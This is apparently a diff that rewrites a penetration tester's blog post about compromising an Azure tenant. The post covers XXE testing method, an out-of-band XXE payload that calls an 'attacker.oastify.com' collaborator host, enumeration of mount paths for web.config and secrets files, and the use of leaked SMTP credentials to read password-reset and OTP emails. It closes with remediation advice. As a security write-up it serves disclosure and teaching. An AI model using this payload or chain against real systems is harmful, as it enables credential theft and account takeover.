@@ -1,343 +1,184 @@
 <!DOCTYPE html>
 <html lang="en" class="dark">
-  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+  <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>
-      Compromising an Azure Tenant via XXE OOB and web.config Exfiltration - IamJfabian
-    </title>
-
-    
+    <title>Compromising an Azure Tenant via XXE OOB and web.config Exfiltration - IamJfabian</title>
     <link rel="icon" type="image/png" href="/images/favicon.png">
-
-    
-    <link rel="preload" href="https://cdn.tailwindcss.com" as="script" />
-    <link rel="preload" href="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/devicon.min.css" as="style" />
-
-    
     <script src="https://cdn.tailwindcss.com"></script>
     <link rel="stylesheet" href="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/devicon.min.css" />
-
-    
-     
-<head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-
-  <title>Compromising an Azure Tenant via XXE OOB and web.config Exfiltration</title>
-  <meta name="description" content="">
-
-  <link rel="stylesheet" href="http://localhost:1313/css/main.min.177ad2aeadd300ee319ed831846860970fa6821ccfd6c7020768535da778d79a.css" integrity="sha256-F3rSrq3TAO4xntgxhGhglw&#43;mghzP1scCB2hTXad415o=">
-</head>
-
-    
     <style>
-  :root {
-    color-scheme: dark;
-  }
-
-  html, body {
-    background-color: #121212;
-    color: #f3f4f6;
-  }
-
-  .border {
-    border-color: #374151;
-  }
-
-  .carousel-item {
-    display: inline-block;
-    margin: 0 1rem;
-  }
-
-  .flex {
-    display: flex;
-  }
-
-  .flex-col {
-    flex-direction: column;
-  }
-
-  @media (min-width: 768px) {
-    .md\:flex-row {
-      flex-direction: row;
-    }
-  }
-
-  .tech-icon {
-    filter: grayscale(100%) brightness(200%);
-    transition: all 0.3s ease;
-  }
-
-  .tech-icon:hover {
-    filter: none;
-  }
-
-  @keyframes scroll {
-    0% {
-      transform: translateX(0);
-    }
-    100% {
-      transform: translateX(-100%);
-    }
-  }
-
-  .tech-carousel {
-    width: 100%;
-    padding: 1rem 0;
-    overflow: hidden;
-  }
-
-  .tech-track {
-    width: fit-content;
-    animation: scroll 20s linear infinite;
-  }
-
-  .tech-track:hover {
-    animation-play-state: paused;
-  }
-
-  .tech-slide {
-    float: left;
-  }
-</style>
-
-
-    
-    <script>
-      if (
-        localStorage.getItem('color-theme') === 'dark' ||
-        (!('color-theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)
-      ) {
-        document.documentElement.classList.add('dark');
-      } else {
-        document.documentElement.classList.remove('dark');
-      }
-    </script>
-  </head>
-
-  <body class="min-h-screen bg-[#121212] text-gray-100">
-    
-<head>
-    
-    <script async src="https://www.googletagmanager.com/gtag/js?id=G-C0RTF18BT4"></script>
-    <script>
-        window.dataLayer = window.dataLayer || [];
-        function gtag(){dataLayer.push(arguments);}
-        gtag('js', new Date());
-
-        gtag('config', 'G-C0RTF18BT4');
-    </script>
-    
-    <link rel="stylesheet" type='text/css' href="https://cdn.jsdelivr.net/gh/devicons/devicon@latest/devicon.min.css" />
-    <link href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@400;500;600;700&display=swap" rel="stylesheet">
-    <style>
-        body {
-            font-family: 'Space Grotesk', sans-serif;
-        }
+      :root { color-scheme: dark; }
+      html, body { background-color: #121212; color: #f3f4f6; font-family: system-ui, sans-serif; }
+      pre { background: #0d0d0d; border: 1px solid #2d2d2d; border-radius: 8px; padding: 1.25rem; overflow-x: auto; margin: 2rem 0; }
+      code { font-family: 'Courier New', monospace; font-size: 0.85rem; color: #d1d5db; }
+      p code, li code { background: #1a1a1a; padding: 2px 6px; border-radius: 4px; font-size: 0.82rem; color: #e5e7eb; }
+      .tag { display: inline-block; background: #1f2937; border: 1px solid #374151; border-radius: 4px; padding: 2px 10px; font-size: 0.72rem; color: #9ca3af; margin-right: 6px; margin-bottom: 6px; }
+      .concept-box { background: #0f172a; border-left: 3px solid #3b82f6; padding: 1.25rem 1.5rem; border-radius: 0 8px 8px 0; margin: 2rem 0; }
+      .concept-box .label { font-size: 0.7rem; color: #60a5fa; font-weight: 700; letter-spacing: 0.08em; text-transform: uppercase; margin-bottom: 0.6rem; }
+      .concept-box p { margin: 0; color: #cbd5e1; line-height: 1.75; }
+      h1 { color: #f9fafb; }
+      h2 { color: #f9fafb; font-size: 1.4rem; font-weight: 600; margin-top: 3rem; margin-bottom: 1.25rem; padding-bottom: 0.5rem; border-bottom: 1px solid #1f2937; }
+      h3 { color: #e5e7eb; font-size: 1.1rem; font-weight: 500; margin-top: 2.5rem; margin-bottom: 1rem; }
+      p { color: #9ca3af; line-height: 1.8; margin-top: 0; margin-bottom: 1.5rem; }
+      ul { margin-bottom: 1.5rem; }
+      ul li { color: #9ca3af; line-height: 1.8; margin-bottom: 0.6rem; }
+      strong { color: #e5e7eb; }
     </style>
-</head>
-<header class="py-6 relative">
-    <div class="max-w-6xl mx-auto px-4">
-        <div class="flex flex-col md:flex-row md:items-center md:justify-between gap-4">
-            <div class="flex justify-between items-center">
-                <a href="http://localhost:1313/" class="text-xl font-bold text-white hover:text-gray-300 transition-colors duration-300">
-                    Josias Fabian
-                </a>
-                
-                <button id="mobile-menu-button" class="md:hidden text-gray-300 hover:text-white focus:outline-none">
-                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M4 6h16M4 12h16M4 18h16"></path>
-                    </svg>
-                </button>
-            </div>            
-            
-            <nav class="hidden md:flex flex-wrap justify-center items-center gap-4 md:gap-6">
-                
-                
-                <a href="http://localhost:1313/about/" class="inline-block text-lg text-gray-300 hover:text-white transition-colors duration-300 ">About</a>
-                
-                <a href="http://localhost:1313/experience/" class="inline-block text-lg text-gray-300 hover:text-white transition-colors duration-300 ">Experience</a>
-                
-                <a href="http://localhost:1313/projects/" class="inline-block text-lg text-gray-300 hover:text-white transition-colors duration-300 ">Projects</a>
-                
-                <a href="http://localhost:1313/blogs/" class="inline-block text-lg text-gray-300 hover:text-white transition-colors duration-300 ">Blogs</a>
-                
-                <a href="http://localhost:1313/contact/" class="inline-block text-lg text-gray-300 hover:text-white transition-colors duration-300 ">Contact</a>
-                
-            </nav>
-            <div class="hidden md:flex justify-end">
-                <div class="flex items-center">
-                    <span class="text-lg text-gray-300 mr-2">Local Time:</span>
-                    <div id="local-time" class="text-lg text-gray-300"></div>
-                </div>
-            </div>
-        </div>
-    </div>
+  </head>
+  <body class="min-h-screen">
+    <nav class="border-b border-gray-800 px-6 py-4 flex items-center justify-between">
+      <a href="/" class="text-xl font-bold text-white">Josias Fabian</a>
+      <div class="flex gap-6 text-gray-400 text-sm">
+        <a href="/about" class="hover:text-white transition">About</a>
+        <a href="/experience" class="hover:text-white transition">Experience</a>
+        <a href="/projects" class="hover:text-white transition">Projects</a>
+        <a href="/blogs" class="hover:text-white transition">Blogs</a>
+        <a href="/contact" class="hover:text-white transition">Contact</a>
+      </div>
+    </nav>
 
-    
-    <div id="mobile-menu" class="fixed inset-0 bg-black bg-opacity-90 z-50 hidden transition-all duration-300">
-        <div class="flex flex-col h-full">
-            <div class="flex justify-between items-center p-6 border-b border-gray-800">
-                <span class="text-xl font-bold text-white">Menu</span>
-                <button id="mobile-menu-close" class="text-gray-300 hover:text-white focus:outline-none">
-                    <svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
-                        <path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"></path>
-                    </svg>
-                </button>
-            </div>
-            <nav class="flex flex-col p-6 space-y-4">
-                
-                <a href="http://localhost:1313/about/" class="text-xl text-gray-300 hover:text-white transition-colors duration-300 ">About</a>
-                
-                <a href="http://localhost:1313/experience/" class="text-xl text-gray-300 hover:text-white transition-colors duration-300 ">Experience</a>
-                
-                <a href="http://localhost:1313/projects/" class="text-xl text-gray-300 hover:text-white transition-colors duration-300 ">Projects</a>
-                
-                <a href="http://localhost:1313/blogs/" class="text-xl text-gray-300 hover:text-white transition-colors duration-300 ">Blogs</a>
-                
-                <a href="http://localhost:1313/contact/" class="text-xl text-gray-300 hover:text-white transition-colors duration-300 ">Contact</a>
-                
-            </nav>
-            <div class="mt-auto p-6 border-t border-gray-800">
-                <div class="flex items-center justify-center">
-                    <span class="text-lg text-gray-300 mr-2">Local Time:</span>
-                    <div id="mobile-local-time" class="text-lg text-gray-300"></div>
-                </div>
-            </div>
-        </div>
-    </div>
-</header>
+    <main class="max-w-2xl mx-auto px-6 py-16">
 
-<script>
-    
-    function updateLocalTime() {
-        const timeElements = document.querySelectorAll('#local-time, #mobile-local-time');
-        timeElements.forEach(element => {
-            if (element) {
-                const now = new Date();
-                const timeString = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
-                element.textContent = timeString;
-            }
-        });
-    }
-    updateLocalTime();
-    setInterval(updateLocalTime, 1000);
+      <div class="mb-6">
+        <span class="tag">XXE</span>
+        <span class="tag">Azure</span>
+        <span class="tag">OOB</span>
+        <span class="tag">Cloud Security</span>
+        <span class="tag">Web</span>
+      </div>
 
-    
-    const mobileMenuButton = document.getElementById('mobile-menu-button');
-    const mobileMenuClose = document.getElementById('mobile-menu-close');
-    const mobileMenu = document.getElementById('mobile-menu');
+      <h1 class="text-3xl font-bold text-white mb-3 leading-tight">Compromising an Azure Tenant via XXE OOB and web.config Exfiltration</h1>
+      <p class="text-gray-500 text-sm mb-12">May 26, 2025 &nbsp;·&nbsp; External + Gray-box Pentest</p>
 
-    function toggleMobileMenu() {
-        const isHidden = mobileMenu.classList.contains('hidden');
-        if (isHidden) {
-            mobileMenu.classList.remove('hidden');
-            document.body.style.overflow = 'hidden'; 
-        } else {
-            mobileMenu.classList.add('hidden');
-            document.body.style.overflow = ''; 
-        }
-    }
+      <h2>How to Approach XXE Testing</h2>
 
-    mobileMenuButton.addEventListener('click', toggleMobileMenu);
-    mobileMenuClose.addEventListener('click', toggleMobileMenu);
+      <p>XXE vulnerabilities are easy to miss if you are only looking at JSON APIs. They live in XML parsers, and XML is more common than people expect: SOAP endpoints, document upload features, data import flows, RSS and Atom feeds, office file formats, and legacy transactional APIs. Any place where the application accepts and parses XML is worth probing.</p>
 
-    
-    const mobileMenuLinks = mobileMenu.querySelectorAll('a');
-    mobileMenuLinks.forEach(link => {
-        link.addEventListener('click', () => {
-            toggleMobileMenu();
-        });
-    });
+      <p>The first test is always a basic external entity reference. Point it at a domain you control using Burp Collaborator or an OAST service and see if you get a callback. If you do, the parser is resolving external entities and you have confirmed XXE. The response does not need to contain any data at this stage — the DNS or HTTP ping is enough.</p>
 
-    
-    const themeToggleBtn = document.getElementById('theme-toggle');
-    if (themeToggleBtn) {
-        const themeToggleDarkIcon = document.getElementById('theme-toggle-dark-icon');
-        const themeToggleLightIcon = document.getElementById('theme-toggle-light-icon');
+      <p>When the response does not reflect data back to you, that does not mean the vulnerability is unexploitable. Out-of-band exfiltration works by defining an external DTD that reads a local file and sends its contents as a parameter to your listener. The data travels in a DNS lookup or HTTP request rather than in the HTTP response, which is why it bypasses filters that only look at what the server returns.</p>
 
-        if (localStorage.getItem('color-theme') === 'dark' || (!('color-theme' in localStorage) && window.matchMedia('(prefers-color-scheme: dark)').matches)) {
-            themeToggleLightIcon.classList.remove('hidden');
-            themeToggleDarkIcon.classList.add('hidden');
-        } else {
-            themeToggleLightIcon.classList.add('hidden');
-            themeToggleDarkIcon.classList.remove('hidden');
-        }
+      <p>For file path selection on Windows IIS targets, start with <code>C:\inetpub\wwwroot\web.config</code>. If that returns nothing, check the Azure Portal for custom path mappings under App Service configuration. Mount points redirect the app's file structure to specific Azure File shares, and the actual files may be at non-standard paths that require some enumeration to find.</p>
 
-        themeToggleBtn.addEventListener('click', function() {
-            themeToggleDarkIcon.classList.toggle('hidden');
-            themeToggleLightIcon.classList.toggle('hidden');
+      <p>Do not rely on the principal directory alone. Fuzz variations of high-value filenames like <code>web.config</code>, <code>appsettings.json</code>, and <code>secrets.env</code> across every mount path you can identify. One of them will eventually respond.</p>
 
-            if (localStorage.getItem('color-theme')) {
-                if (localStorage.getItem('color-theme') === 'light') {
-                    document.documentElement.classList.add('dark');
-                    localStorage.setItem('color-theme', 'dark');
-                } else {
-                    document.documentElement.classList.remove('dark');
-                    localStorage.setItem('color-theme', 'light');
-                }
-            } else {
-                if (document.documentElement.classList.contains('dark')) {
-                    document.documentElement.classList.remove('dark');
-                    localStorage.setItem('color-theme', 'light');
-                } else {
-                    document.documentElement.classList.add('dark');
-                    localStorage.setItem('color-theme', 'dark');
-                }
-            }
-        });
-    }
-</script> 
-    
-    <main>
-      
-<article class="max-w-3xl mx-auto py-12 px-4">
-  <h1 class="text-4xl font-bold mb-4">Compromising an Azure Tenant via XXE OOB and web.config Exfiltration</h1>
-  <p class="text-sm text-gray-400 mb-8">May 26, 2025</p>
-  <div class="prose dark:prose-invert max-w-none">
-    <p>In this post, I’ll walk you through how an <strong>XML External Entity (XXE)</strong> vulnerability with <strong>Out-of-Band (OOB)</strong> exfiltration capabilities led to the compromise of an <strong>Azure tenant</strong> during a hybrid penetration test engagement&hellip;</p>
-<p>curl -sLO <a href="https://github.com/tailwindlabs/tailwindcss/releases/latest/download/tailwindcss-linux-x64">https://github.com/tailwindlabs/tailwindcss/releases/latest/download/tailwindcss-linux-x64</a></p>
-<p>chmod +x tailwindcss-linux-x64
-sudo mv tailwindcss-linux-x64 /usr/local/bin/tailwindcss</p>
+      <h2>Background</h2>
 
-  </div>
-</article>
+      <p>This engagement was a two-week assessment for a transactional company fully hosted in Microsoft Azure. The scope covered both an external black-box evaluation of all publicly exposed services and an authenticated gray-box assessment with least-privilege reader access to the Azure subscription. That combination ended up being the key detail.</p>
+
+      <p>The early part of the assessment went as expected. We found overly permissive CORS policies on several subdomains, SQL injection points, and exposed personally identifiable information. Serious findings, but not unusual. What came next was different.</p>
+
+      <h2>Finding the Entry Point</h2>
+
+      <p>During manual inspection of publicly accessible resources, we found an exposed WordPress directory at <code>/wp-content/</code> on one of the subdomains. Inside it was detailed API documentation for a legacy transactional endpoint used for payment processing. The documentation described every field the API accepted and how the server processed incoming requests.</p>
+
+      <p>The API accepted XML-formatted requests. That alone is a flag worth following.</p>
+
+      <p>Armed with the documented request structure, we began crafting payloads. After several rounds of testing and adjustment, we confirmed that the server was parsing XML without disabling external entity resolution. More importantly, we got an out-of-band callback to our OAST collaborator, confirming that the server would reach out to attacker-controlled infrastructure when processing our payloads.</p>
+
+      <div class="concept-box">
+        <div class="label">Concept</div>
+        <p>An <strong style="color:#93c5fd;">XML External Entity (XXE)</strong> injection occurs when an XML parser processes user-supplied input that includes a reference to an external entity. If the parser resolves external entities without restriction, an attacker can use this to read local files, trigger server-side requests, or exfiltrate data to an external listener. <strong style="color:#93c5fd;">Out-of-Band XXE</strong> is the variant where the exfiltrated data does not appear in the HTTP response. Instead, the server is made to send the data to an attacker-controlled endpoint through a secondary channel, typically a DNS lookup or HTTP request, making it much harder to detect and block.</p>
+      </div>
+
+      <svg width="100%" viewBox="0 0 680 430" role="img" style="margin: 2rem 0; display: block;">
+        <title>XXE OOB to Azure Tenant Compromise Attack Chain</title>
+        <desc>Flowchart: exposed API docs reveal XML endpoint, XXE OOB confirmed via collaborator, Azure path mappings identified, web.config exfiltrated, credentials extracted, tenant compromised.</desc>
+        <defs>
+          <marker id="arrow3" viewBox="0 0 10 10" refX="8" refY="5" markerWidth="6" markerHeight="6" orient="auto-start-reverse">
+            <path d="M2 1L8 5L2 9" fill="none" stroke="context-stroke" stroke-width="1.5" stroke-linecap="round" stroke-linejoin="round"/>
+          </marker>
+        </defs>
+        <style>
+          .arr3 { stroke: #6b7280; fill: none; stroke-width: 1.5; }
+          .th3 { font-family: system-ui, sans-serif; font-size: 14px; font-weight: 500; fill: #f3f4f6; }
+          .ts3 { font-family: system-ui, sans-serif; font-size: 12px; font-weight: 400; fill: #9ca3af; }
+          .xxe-gray rect { fill: #1f2937; stroke: #374151; }
+          .xxe-amber rect { fill: #2d1f08; stroke: #854f0b; }
+          .xxe-coral rect { fill: #3d1a13; stroke: #993c1d; }
+          .xxe-red rect { fill: #3d1212; stroke: #a32d2d; }
+        </style>
+        <g class="xxe-gray"><rect x="180" y="20" width="320" height="56" rx="8" stroke-width="0.5"/><text class="th3" x="340" y="42" text-anchor="middle" dominant-baseline="central">Exposed /wp-content/ with API docs</text><text class="ts3" x="340" y="62" text-anchor="middle" dominant-baseline="central">Legacy XML payment endpoint documented</text></g>
+        <line x1="340" y1="76" x2="340" y2="110" class="arr3" marker-end="url(#arrow3)"/>
+        <g class="xxe-amber"><rect x="180" y="110" width="320" height="56" rx="8" stroke-width="0.5"/><text class="th3" x="340" y="132" text-anchor="middle" dominant-baseline="central">XXE OOB confirmed</text><text class="ts3" x="340" y="152" text-anchor="middle" dominant-baseline="central">OAST callback received from server</text></g>
+        <line x1="340" y1="166" x2="340" y2="200" class="arr3" marker-end="url(#arrow3)"/>
+        <g class="xxe-gray"><rect x="180" y="200" width="320" height="56" rx="8" stroke-width="0.5"/><text class="th3" x="340" y="222" text-anchor="middle" dominant-baseline="central">Azure path mappings identified</text><text class="ts3" x="340" y="242" text-anchor="middle" dominant-baseline="central">Reader access reveals mount points</text></g>
+        <line x1="340" y1="256" x2="340" y2="290" class="arr3" marker-end="url(#arrow3)"/>
+        <g class="xxe-coral"><rect x="180" y="290" width="320" height="56" rx="8" stroke-width="0.5"/><text class="th3" x="340" y="312" text-anchor="middle" dominant-baseline="central">web.config exfiltrated via OOB XXE</text><text class="ts3" x="340" y="332" text-anchor="middle" dominant-baseline="central">DB credentials + SMTP credentials exposed</text></g>
+        <line x1="340" y1="346" x2="340" y2="380" class="arr3" marker-end="url(#arrow3)"/>
+        <g class="xxe-red"><rect x="180" y="380" width="320" height="36" rx="8" stroke-width="0.5"/><text class="th3" x="340" y="398" text-anchor="middle" dominant-baseline="central">Email access + OTP interception</text></g>
+        <text class="ts3" x="30" y="48" text-anchor="start">Recon</text>
+        <text class="ts3" x="30" y="138" text-anchor="start">Step 1</text>
+        <text class="ts3" x="30" y="228" text-anchor="start">Step 2</text>
+        <text class="ts3" x="30" y="318" text-anchor="start">Step 3</text>
+        <text class="ts3" x="30" y="398" text-anchor="start">Result</text>
+      </svg>
+
+      <h2>The XXE Payload</h2>
+
+      <p>The payload that confirmed the vulnerability was a classic OOB trigger. We embedded an external entity reference pointing at our Burp Collaborator domain inside a valid request that matched the documented API format.</p>
+
+      <pre><code>&lt;!DOCTYPE test [
+  &lt;!ENTITY xxe SYSTEM "http://attacker.oastify.com"&gt;
+]&gt;
+&lt;stockCheck&gt;
+  &lt;productId&gt;&amp;xxe;&lt;/productId&gt;
+  &lt;storeId&gt;1&lt;/storeId&gt;
+&lt;/stockCheck&gt;</code></pre>
+
+      <p>The callback arrived on our collaborator client almost immediately. The server reached out to our domain when processing the request, which confirmed the parser was expanding external entities. At this point we had a confirmed XXE OOB and the question shifted from whether to how far we could take it.</p>
+
+      <h2>Escalation via Azure Path Mappings</h2>
+
+      <p>Initial attempts to exfiltrate files from the default IIS paths returned limited results. The principal directory did not contain anything immediately useful. This is where the gray-box access became critical.</p>
+
+      <p>With reader-level access to the Azure subscription, we opened the App Service blade in the Azure Portal and examined the configuration of the vulnerable app. Under Configuration and Path Mappings, we found custom mount points that redirected parts of the application's file structure to Azure File shares. These were paths we would never have found through blind fuzzing alone.</p>
+
+      <div class="concept-box">
+        <div class="label">Concept</div>
+        <p><strong style="color:#93c5fd;">Azure App Service path mappings</strong> allow the application to mount external storage, such as Azure File shares or Blob containers, at specific virtual paths within the app's file system. From a security standpoint, these mounts often contain configuration files and secrets that are managed separately from the app's source code, which means they may not follow the same hardening practices applied to the main deployment.</p>
+      </div>
+
+      <p>Knowing the exact mount paths, we switched to aggressive fuzzing of high-value filenames across each of those directories. We tried variations of <code>web.config</code>, <code>appsettings.json</code>, and <code>secrets.env</code> at each path. One of the payloads eventually returned data through our OOB listener. A complete <code>web.config</code> file came through.</p>
+
+      <h2>What the web.config Contained</h2>
+
+      <p>The file included production database connection strings with plaintext credentials and SMTP server login credentials for a sender account used in automated workflows. That second item was the one that changed the severity of the finding.</p>
+
+      <p>We tested the SMTP credentials and confirmed they provided access to a functioning corporate email account. Inside that inbox were emails related to password reset flows, OTP deliveries, and sensitive operational correspondence. The account was tied to the authentication system for end users, meaning it was involved in every password recovery and account verification action on the platform.</p>
+
+      <p>The implications were significant. With access to that inbox, an attacker could intercept OTPs and password reset links for any user account, effectively enabling full account takeover at scale without needing to touch the application directly.</p>
+
+      <p>The web.config also contained database credentials. We attempted to connect but the server was protected by IP whitelisting. Without an allowed source IP, the database would not respond. We considered options like routing through the compromised app or rotating outbound IPs through cloud services, but the engagement window was closing. We documented the vector and moved on, leaving it as a finding with confirmed credential exposure and unconfirmed database access.</p>
+
+      <h2>Impact</h2>
+      <ul class="list-disc list-inside ml-2">
+        <li>Full read access to a corporate email account involved in password recovery and OTP delivery for all users</li>
+        <li>Ability to intercept one-time passwords and password reset links for any account on the platform</li>
+        <li>Production database credentials extracted, with access blocked only by IP whitelisting</li>
+        <li>Potential for lateral movement through internal email phishing from a trusted sender identity</li>
+      </ul>
+
+      <h2>Remediation</h2>
+      <ul class="list-disc list-inside ml-2">
+        <li>Disable external entity resolution in all XML parsers by default — set <code>XmlResolver</code> to null</li>
+        <li>Remove internal API documentation from publicly accessible directories</li>
+        <li>Store secrets in Azure Key Vault, not in <code>web.config</code> or <code>.env</code> files</li>
+        <li>Audit and restrict path mappings to limit exposure of sensitive file systems through mounted shares</li>
+        <li>Rotate all credentials found in the exfiltrated configuration file immediately</li>
+        <li>Apply stricter access controls to email accounts used in automated authentication workflows</li>
+        <li>Enforce network-level restrictions on database access beyond IP whitelisting alone</li>
+      </ul>
+
+      <div class="border-t border-gray-800 pt-8 mt-12 text-sm text-gray-600">
+        Vulnerability details have been generalized to protect client confidentiality. All findings were reported and remediated as part of the engagement.
+      </div>
 
     </main>
-    
-<footer class="mt-32 text-center">
-    <div class="max-w-3xl mx-auto">
-        <div class="border-t border-gray-800 pt-5">
-            <div class="flex flex-col items-center justify-center gap-2">                
-                <p class="text-gray-500 text-xm ">© 2025 Josias Fabian</p>
-                <p class="text-gray-500 text-xm pb-12">Built using <a href="https://gohugo.io/" target="_blank" class="animated-link text-gray-400 hover:text-gray-200">Hugo</a>. Take a look at my <a href="https://github.com/prxshetty/" target="_blank" class="animated-link text-gray-400 hover:text-gray-200">GitHub</a></p>
-            </div>
-        </div>
-    </div>
-</footer>
 
-<style>
-    .animated-link {
-        position: relative;
-        display: inline-flex;
-        align-items: center;
-    }
-    
-    .animated-link::after {
-        content: '';
-        position: absolute;
-        width: 0;
-        height: 1px;
-        bottom: -1px;
-        left: 0;
-        background-color: #ffffff;
-        transition: width 0.3s ease-in-out;
-    }
-    
-    .animated-link:hover::after {
-        width: 100%;
-    }
-</style> 
+    <footer class="border-t border-gray-800 mt-20 py-6 text-center text-gray-600 text-sm">
+      2025 Josias Fabian &nbsp;·&nbsp; <a href="https://github.com/j05145" class="hover:text-white transition">GitHub</a>
+    </footer>
   </body>
 </html>
